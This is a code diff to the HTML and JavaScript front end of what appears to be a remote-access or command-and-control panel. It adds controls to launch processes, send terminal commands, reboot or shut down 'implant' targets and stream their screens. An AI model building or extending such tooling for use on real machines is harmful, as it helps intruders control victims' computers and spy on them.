+                                <input id="new-process-path" type="text" placeholder="Path to executable (e.g., C:\\Windows\\System32\\notepad.exe)" style="width:100%; background:var(--input-bg); color:var(--text-color); font-family:var(--font-family); font-size:12px; padding:10px 12px; border:1px solid var(--secondary); border-radius:4px; outline:none;" />
+                                <div style="display:flex; justify-content:flex-end; gap:10px;">
+                                    <button class="button" onclick="closeNewProcessDialog()">Cancel</button>
+                                    <button class="button" style="background:var(--accent); border-color:var(--accent); color:#000;" onclick="launchNewProcess()">Launch</button>
+                                </div>
                             </div>
                         `}
                     ]},
-                    {header:'Intel', span:'fill', controls:[
+                    {header:'System Utilities', span:'fill', controls:[
+                        { ui:'button', label:'System Reboot', type:'double', text:'Reboot', secondarytext:'Confirm Reboot?', action:'sys_reboot'},
+                        { ui:'button', label:'System Shutdown', type:'double', text:'Shutdown', secondarytext:'Confirm Shutdown?', action:'sys_shutdown'},
                     ]},
                 ]
             },
@@ -1044,6 +1156,7 @@
                     { header:'Theme', span:'hhalf', controls:[
                         { ui:'colorpicker', label:'Background Color', flag:'BackgroundColor'},
                         { ui:'colorpicker', label:'Primary Color', flag:'PrimaryColor'},
+                        { ui:'colorpicker', label:'Secondary Color', flag:'SecondaryColor'}, /* Added secondary color control */
                         { ui:'colorpicker', label:'Accent Color', flag:'AccentColor'},
                         { ui:'colorpicker', label:'Text Color', flag:'TextColor'},
                         { ui:'colorpicker', label:'Marker Color', flag:'MarkerColor'},
@@ -1058,47 +1171,103 @@
                     ]},
                     {header:'Config', span:'hhalf', controls:[
                         { ui:'dropdown', label:'Notification Position', type:'single', options: ["Top","Top Left","Top Right","Center","Bottom","Bottom Left","Bottom Right"], flag:'NotificationLocation'},
+                        { ui:'dropdown', label:'Globe Imagery', type:'single', options: ["esri-imagery", "carto-dark", "carto-light", "osm"], flag:'GlobeImagery'},
                     ]},
                 ]
             }
         };
 
+        // --- Dialogs for Process Management ---
+        function openNewProcessDialog() {
+            document.getElementById('new-process-dialog').style.display = 'flex';
+        }
+        function closeNewProcessDialog() {
+            document.getElementById('new-process-dialog').style.display = 'none';
+            document.getElementById('new-process-path').value = '';
+        }
+        function launchNewProcess() {
+            const path = document.getElementById('new-process-path').value.trim();
+            if (path) {
+                sendImplantCmd('new_ps', { path: path });
+                closeNewProcessDialog();
+            } else {
+                __orionNotify({Type: 'text', Variant: 'warn', Text: 'Path Empty', Subtext: 'Please enter an executable path.', Icon: 'ph ph-warning', AutoClose: 3});
+            }
+        }
+        function sendTermFromButton(command) {
+            const out = document.getElementById('term-out');
+            if(out) out.value += `\n> ${command}\n`;
+            sendImplantCmd('term_cmd', { cmd: command });
+        }
+
+
+        // Resets UI_CONFIG to default and applies theme
         function resetThemeToDefault() {
             Object.assign(UI_CONFIG, DEFAULT_UI_CONFIG);
             applyTheme();
+            // Rebuild settings tab to reflect new values in controls
             document.getElementById('contentInject').innerHTML = buildPanel('settings');
-            document.title = "recv://" + JSON.stringify(DEFAULT_UI_CONFIG);
+            document.title = "recv://" + JSON.stringify(DEFAULT_UI_CONFIG); // Inform backend
             if (viewer) setGlobeImagery(UI_CONFIG.GlobeImagery);
             refreshMarkerColors();
         }
 
+        // Handles button clicks, including double-confirmation buttons
         function handleButtonClick(el, flag, action) {
             const type = el.dataset.type;
-            if (action === 'globeHome') { globeHome(); return; }
-            if (action === 'globeNight') { globeNight(); return; }
-
-            if (type === 'double') {
-                if (el.dataset.confirming === 'true') {
-                    clearTimeout(el.timer); el.dataset.confirming = 'false'; el.textContent = el.dataset.text;
-                    if (flag === 'ResetTheme') { resetThemeToDefault(); return; }
-                    if(flag) updateBackend(flag, true);
-                } else {
-                    el.dataset.confirming = 'true'; el.textContent = el.dataset.secondarytext;
-                    el.timer = setTimeout(() => { el.dataset.confirming = 'false'; el.textContent = el.dataset.text; }, 2500);
+            if (action) { // Direct actions
+                if (action === 'sys_info') sendImplantCmd('sys_info');
+                else if (action === 'sys_reboot') {
+                    if (type === 'double' && el.dataset.confirming !== 'true') {
+                        el.dataset.confirming = 'true'; el.textContent = el.dataset.secondarytext;
+                        el.timer = setTimeout(() => { el.dataset.confirming = 'false'; el.textContent = el.dataset.text; }, 2500);
+                        return; // Wait for confirmation
+                    }
+                    sendImplantCmd('sys_reboot');
                 }
-            } else {
-                if (flag === 'ResetTheme') { resetThemeToDefault(); return; }
-                if(flag) updateBackend(flag, true);
+                else if (action === 'sys_shutdown') {
+                    if (type === 'double' && el.dataset.confirming !== 'true') {
+                        el.dataset.confirming = 'true'; el.textContent = el.dataset.secondarytext;
+                        el.timer = setTimeout(() => { el.dataset.confirming = 'false'; el.textContent = el.dataset.text; }, 2500);
+                        return; // Wait for confirmation
+                    }
+                    sendImplantCmd('sys_shutdown');
+                }
+                // Clear confirmation state if action was successful after double-click
+                if (type === 'double' && el.dataset.confirming === 'true') {
+                    clearTimeout(el.timer); el.dataset.confirming = 'false'; el.textContent = el.dataset.text;
+                }
+            }
+
+            // Flag-based updates to backend
+            if (flag) {
+                if (type === 'double') {
+                    if (el.dataset.confirming === 'true') {
+                        clearTimeout(el.timer); el.dataset.confirming = 'false'; el.textContent = el.dataset.text;
+                        if (flag === 'ResetTheme') { resetThemeToDefault(); return; }
+                        updateBackend(flag, true);
+                    } else {
+                        el.dataset.confirming = 'true'; el.textContent = el.dataset.secondarytext;
+                        el.timer = setTimeout(() => { el.dataset.confirming = 'false'; el.textContent = el.dataset.text; }, 2500);
+                    }
+                } else {
+                    if (flag === 'ResetTheme') { resetThemeToDefault(); return; }
+                    updateBackend(flag, true);
+                }
             }
         }
 
+
         let isDraggingColor = false, isDraggingHue = false, activeColorContainer = null;
+        // HSV to RGB conversion
         function hsvToRgb(h, s, v) {
             let r, g, b; let i = Math.floor(h * 6); let f = h * 6 - i; let p = v * (1 - s); let q = v * (1 - f * s); let t = v * (1 - (1 - f) * s);
             switch (i % 6) { case 0: r=v, g=t, b=p; break; case 1: r=q, g=v, b=p; break; case 2: r=p, g=v, b=t; break; case 3: r=p, g=q, b=v; break; case 4: r=t, g=p, b=v; break; case 5: r=v, g=p, b=q; break; }
             return { r: Math.round(r * 255), g: Math.round(g * 255), b: Math.round(b * 255) };
         }
+        // RGB to Hex conversion
         function rgbToHex(r, g, b) { return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase(); }
+        // Hex to HSV conversion
         function hexToHsv(hex) {
             hex = hex.replace('#', ''); if(hex.length === 3) hex = hex.split('').map(c=>c+c).join('');
             let r = parseInt(hex.substring(0,2), 16) / 255; let g = parseInt(hex.substring(2,4), 16) / 255; let b = parseInt(hex.substring(4,6), 16) / 255;
@@ -1106,10 +1275,12 @@
             if (max === min) { h = 0; } else { switch (max) { case r: h = (g - b) / d + (g < b ? 6 : 0); break; case g: h = (b - r) / d + 2; break; case b: h = (r - g) / d + 4; break; } h /= 6; }
             return { h, s, v };
         }
+        // Toggles visibility of color picker popover
         function toggleColorPicker(el) {
             const container = el.parentElement; const isOpen = container.classList.contains('open'); closeAllPopovers();
-            if(!isOpen) { container.classList.add('open'); el.classList.add('active'); const hex = container.querySelector('.color-hex-input').value; const hsv = hexToHsv(hex); updateColorUIFromHSV(container, hsv.h, hsv.s, hsv.v); }
+            if(!isOpen) { container.classList.add('open'); el.classList.add('active'); const hex = container.querySelector('.color-hex-input').value; const hsv = hexToHsv('#' + hex); updateColorUIFromHSV(container, hsv.h, hsv.s, hsv.v); }
         }
+        // Handles color selection drag events
         function handleColorDrag(e, container, type) {
             const field = container.querySelector('.color-field'); const hueRail = container.querySelector('.color-hue-rail'); const rect = (type === 'field' ? field : hueRail).getBoundingClientRect();
             let x = Math.max(0, Math.min(e.clientX - rect.left, rect.width)); let y = Math.max(0, Math.min(e.clientY - rect.top, rect.height));
@@ -1117,6 +1288,7 @@
             if (type === 'hue') h = x / rect.width; else { s = x / rect.width; v = 1 - (y / rect.height); }
             updateColorUIFromHSV(container, h, s, v);
         }
+        // Updates color picker UI based on HSV values
         function updateColorUIFromHSV(container, h, s, v) {
             container.dataset.h = h; container.dataset.s = s; container.dataset.v = v;
             const rgb = hsvToRgb(h, s, v); const hex = rgbToHex(rgb.r, rgb.g, rgb.b); const pureHueRgb = hsvToRgb(h, 1, 1); const pureHueHex = rgbToHex(pureHueRgb.r, pureHueRgb.g, pureHueRgb.b);
@@ -1125,8 +1297,10 @@
             const thumb = container.querySelector('.color-hue-thumb'); thumb.style.left = (h * 100) + '%';
             const flag = container.dataset.flag; if (flag) updateBackend(flag, hex);
         }
+        // Updates color from hex input field
         function updateColorFromInput(input) { let val = input.value; if(!val.startsWith('#')) val = '#' + val; if (/^#[0-9A-F]{6}$/i.test(val)) { const hsv = hexToHsv(val); const container = input.closest('.color-container'); updateColorUIFromHSV(container, hsv.h, hsv.s, hsv.v); } }
         
+        // Global mouse events for color picker dragging
         window.addEventListener('mousedown', (e) => {
             const colorField = e.target.closest('.color-field'); const hueRail = e.target.closest('.color-hue-rail');
             if (colorField) { isDraggingColor = true; activeColorContainer = colorField.closest('.color-container'); handleColorDrag(e, activeColorContainer, 'field'); }
@@ -1138,10 +1312,28 @@
         });
         window.addEventListener('mouseup', () => { isDraggingColor = false; isDraggingHue = false; activeColorContainer = null; });
 
+        // Handles toggle switch clicks
         function handleToggleClick(el, flag) { el.classList.toggle('on'); updateBackend(flag, el.classList.contains('on')); }
-        function updateSliderTooltip(input, flag) { const val = parseFloat(input.value); const min = parseFloat(input.min); const max = parseFloat(input.max); const percent = (val - min) / (max - min) * 100; const tooltip = input.parentElement.querySelector('.slider-tooltip'); if (tooltip) { tooltip.textContent = val; const correction = 8 - (percent * 0.16); tooltip.style.left = `calc(${percent}% + ${correction}px)`; } updateBackend(flag, val); }
+        // Updates slider tooltip and backend value
+        function updateSliderTooltip(input, flag) { 
+            const val = parseFloat(input.value); 
+            const min = parseFloat(input.min); 
+            const max = parseFloat(input.max); 
+            const percent = (val - min) / (max - min) * 100; 
+            const tooltip = input.parentElement.querySelector('.slider-tooltip'); 
+            if (tooltip) { 
+                tooltip.textContent = val; 
+                // Adjust tooltip position to stay within bounds
+                const thumbWidth = 14; // Approximate thumb width
+                const offset = (thumbWidth / 2) - (thumbWidth * percent / 100);
+                tooltip.style.left = `calc(${percent}% + ${offset}px)`;
+            } 
+            updateBackend(flag, val); 
+        }
+        // Toggles dropdown menu visibility
         function toggleDropdown(el) { const container = el.parentElement; const isOpen = container.classList.contains('open'); closeAllPopovers(); if(!isOpen) { container.classList.add('open'); el.classList.add('active'); } }
         
+        // Selects an option in a dropdown
         function selectOption(el, value) { 
             const container = el.closest('.dropdown-container'); 
             const display = container.querySelector('.dropdown-selected span'); 
@@ -1153,12 +1345,13 @@
             closeAllPopovers(); 
 
             if(flag === 'ImplantTarget') {
+                // When implant target changes, reset UI elements and fetch new data
                 setTimeout(() => {
                     sendImplantCmd('sys_info');
                     sendImplantCmd('screen_stop');
                     isStreaming = false;
-                    const btnStream = document.getElementById('btn-stream');
-                    if (btnStream) btnStream.innerHTML = '<i class="fa-solid fa-play" style="margin-right:6px"></i> Start Stream';
+                    const btnStream = document.getElementById('btn-toggle-stream');
+                    if (btnStream) btnStream.innerHTML = '<i class="ph ph-play" style="margin-right:6px"></i> Start Stream';
                     const lsImg = document.getElementById('live-screen-img');
                     if (lsImg) lsImg.style.display = 'none';
                     const lsIco = document.getElementById('live-screen-icon');
@@ -1171,9 +1364,12 @@
             }
         }
         
+        // Closes all active dropdowns and color pickers
         function closeAllPopovers() { document.querySelectorAll('.dropdown-container.open, .color-container.open').forEach(d => { d.classList.remove('open'); const trigger = d.querySelector('.dropdown-selected, .color-trigger'); if(trigger) trigger.classList.remove('active'); }); }
-        window.addEventListener('click', function(e) { if (!e.target.closest('.dropdown-container') && !e.target.closest('.color-container') && !isDraggingColor && !isDraggingHue) closeAllPopovers(); });
+        // Closes popovers when clicking outside
+        window.addEventListener('click', function(e) { if (!e.target.closest('.dropdown-container') && !e.target.closest('.color-container') && !isDraggingColor && !isDraggingHue && !e.target.closest('#new-process-dialog')) closeAllPopovers(); });
 
+        // Builds HTML for a single control element
         function buildControl(ctrl) {
             if (!ctrl || !ctrl.ui) return '';
             const ui = String(ctrl.ui).toLowerCase();
@@ -1183,16 +1379,28 @@
             const labelText = ctrl.label ?? '';
             let html = `<div class="control-item"><label>${labelText}</label>`;
 
-            let currentVal = SERVER_CONFIG[ctrl.flag]; if (currentVal === undefined) currentVal = UI_CONFIG[ctrl.flag]; if (currentVal === undefined) currentVal = "";
+            let currentVal = SERVER_CONFIG[ctrl.flag]; 
+            if (currentVal === undefined) currentVal = UI_CONFIG[ctrl.flag]; 
+            if (currentVal === undefined) currentVal = ""; // Default if no value found
 
             if (ui === 'toggle') { const flagAttr = ctrl.flag ? ` data-flag="${ctrl.flag}"` : ''; html += `<div class="switch ${currentVal?'on':''}"${flagAttr} onclick="handleToggleClick(this, '${ctrl.flag}')"></div>`; }
             else if (ui === 'slider') { html += `<div class="slider-wrapper"><input type="range" min="${ctrl.min}" max="${ctrl.max}" step="${ctrl.step}" value="${currentVal}" oninput="updateSliderTooltip(this, '${ctrl.flag}')" onmouseover="updateSliderTooltip(this, '${ctrl.flag}')"><div class="slider-tooltip">${currentVal}</div></div>`; }
-            else if (ui === 'button') { const type = ctrl.type || 'single'; html += `<button class="button" data-type="${type}" data-text="${ctrl.text || 'Action'}" data-secondarytext="${ctrl.secondarytext || ''}" onclick="handleButtonClick(this, '${ctrl.flag || ''}', '${ctrl.action || ''}')">${ctrl.text || 'Action'}</button>`; }
-            else if (ui === 'dropdown') { const optionsHtml = ctrl.options.map(opt => { const isSelected = opt === currentVal; return `<div class="dropdown-option ${isSelected ? 'selected' : ''}" onclick="selectOption(this, '${opt}')">${opt}</div>`; }).join(''); html += `<div class="dropdown-container" data-type="${ctrl.type}" data-flag="${ctrl.flag}"><div class="dropdown-selected" onclick="toggleDropdown(this)"><span>${currentVal}</span><i class="fa-solid fa-chevron-down"></i></div><div class="dropdown-options">${optionsHtml}</div></div>`; }
-            else if (ui === 'colorpicker') { html += `<div class="color-container" data-h="0" data-s="1" data-v="1" data-flag="${ctrl.flag}"><div class="color-trigger" onclick="toggleColorPicker(this)"><div class="color-preview" style="background: ${currentVal}"></div></div><div class="color-popover"><div class="color-field"><div class="color-cursor"></div></div><div class="color-hue-rail"><div class="color-hue-thumb"></div></div><div class="color-input-wrapper"><span class="color-hash">#</span><input type="text" class="color-hex-input" value="${currentVal.replace('#','')}" oninput="updateColorFromInput(this)"></div></div></div>`; }
+            else if (ui === 'button') { 
+                const type = ctrl.type || 'single'; 
+                const actionAttr = ctrl.action ? `data-action="${ctrl.action}"` : '';
+                html += `<button class="button" data-type="${type}" data-text="${ctrl.text || 'Action'}" data-secondarytext="${ctrl.secondarytext || ''}" ${actionAttr} onclick="handleButtonClick(this, '${ctrl.flag || ''}', '${ctrl.action || ''}')">${ctrl.text || 'Action'}</button>`; 
+            }
+            else if (ui === 'dropdown') { 
+                const optionsHtml = (ctrl.options || []).map(opt => { const isSelected = opt === currentVal; return `<div class="dropdown-option ${isSelected ? 'selected' : ''}" onclick="selectOption(this, '${opt}')">${opt}</div>`; }).join(''); 
+                html += `<div class="dropdown-container" data-type="${ctrl.type}" data-flag="${ctrl.flag}"><div class="dropdown-selected" onclick="toggleDropdown(this)"><span>${currentVal}</span><i class="fa-solid fa-chevron-down"></i></div><div class="dropdown-options">${optionsHtml}</div></div>`; 
+            }
+            else if (ui === 'colorpicker') { 
+                html += `<div class="color-container" data-h="0" data-s="1" data-v="1" data-flag="${ctrl.flag}"><div class="color-trigger" onclick="toggleColorPicker(this)"><div class="color-preview" style="background: ${currentVal}"></div></div><div class="color-popover"><div class="color-field"><div class="color-cursor"></div></div><div class="color-hue-rail"><div class="color-hue-thumb"></div></div><div class="color-input-wrapper"><span class="color-hash">#</span><input type="text" class="color-hex-input" value="${String(currentVal).replace('#','')}" oninput="updateColorFromInput(this)"></div></div></div>`; 
+            }
             html += `</div>`; return html;
         }
 
+        // Builds the full HTML panel content for a given tab key
         function buildPanel(key) {
             if (key === 'implants') return buildImplantsTab();
             if (key === 'worldview') return buildWorldViewTab();
@@ -1208,6 +1416,7 @@
         }
 
         let lipHideTimer = null;
+        // Resets the timer for the collapsing tabview notch
         function resetLipTimer() {
             const notch = document.getElementById('toggleNotch'); const tabview = document.getElementById('tabview');
             notch.classList.remove('idle-vanish'); clearTimeout(lipHideTimer);
@@ -1215,8 +1424,9 @@
         }
 
         let currentTabIndex = 0;
+        // Initialization function
         function init() {
-            applyTheme();
+            applyTheme(); // Apply initial theme
             const tabview = document.getElementById('tabview'); const toggleNotch = document.getElementById('toggleNotch');
             const tabs = Array.from(document.querySelectorAll('.tab')); const tabsContainer = document.getElementById('tabs');
             const panel = document.getElementById('panel'); const injector = document.getElementById('contentInject');
@@ -1231,11 +1441,14 @@
             const initialTab = document.querySelector('.tab.active'); const initialKey = initialTab.getAttribute('data-tab');
             injector.innerHTML = buildPanel(initialKey);
             
+            // Initial render and animations
             setTimeout(() => { panel.classList.add('active'); try { __orionPositionNotifyStack(); } catch {} }, 100);
             
+            // Tabview collapse/expand logic
             toggleNotch.addEventListener('click', () => { tabview.classList.toggle('collapsed'); resetLipTimer(); __orionPositionNotifyStack(); });
             [toggleNotch, tabview].forEach(el => { el.addEventListener('mouseenter', resetLipTimer); el.addEventListener('mouseleave', resetLipTimer); });
             
+            // Tab switching logic
             tabs.forEach((tab, index) => {
                 tab.addEventListener('click', () => {
                     if (index === currentTabIndex) return;
@@ -1243,25 +1456,27 @@
                     const slideInDir = index > currentTabIndex ? 'right' : 'left';
                     const key = tab.getAttribute('data-tab');
                     tabs.forEach(t => { t.classList.remove('active'); }); tab.classList.add('active');
-                    panel.className = 'content-panel slide-out-' + slideOutDir;
+                    panel.className = 'content-panel slide-out-' + slideOutDir; // Start slide-out animation
                     setTimeout(() => {
-                        if (currentTabIndex === 2) destroyCesiumViewer();
+                        if (currentTabIndex === 2) destroyCesiumViewer(); // Destroy Cesium if leaving worldview
                         
-                        injector.innerHTML = buildPanel(key);
+                        injector.innerHTML = buildPanel(key); // Load new tab content
                         
+                        // Perform tab-specific post-render setup
                         if (key === 'control') updateDropdownDOM('ImplantTarget', TAB_DATA.control.grid[0].controls[0].options);
                         if (key === 'implants') renderImplants(_implants);
                         
-                        injector.scrollTop = 0;
-                        panel.className = 'content-panel slide-in-' + slideInDir;
-                        if (key === 'worldview') setTimeout(initCesium, 100);
-                        setTimeout(() => { panel.className = 'content-panel active'; try { __orionPositionNotifyStack(); } catch {} }, 50);
+                        injector.scrollTop = 0; // Scroll to top of new content
+                        panel.className = 'content-panel slide-in-' + slideInDir; // Start slide-in animation
+                        if (key === 'worldview') setTimeout(initCesium, 100); // Initialize Cesium after panel is visible
+                        setTimeout(() => { panel.className = 'content-panel active'; try { __orionPositionNotifyStack(); } catch {} }, 50); // Final state
                         currentTabIndex = index;
                     }, 350);
                 });
             });
         }
 
+        // Ensure init runs after DOM is fully loaded
         if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); } else { init(); }
     </script>
 </body>
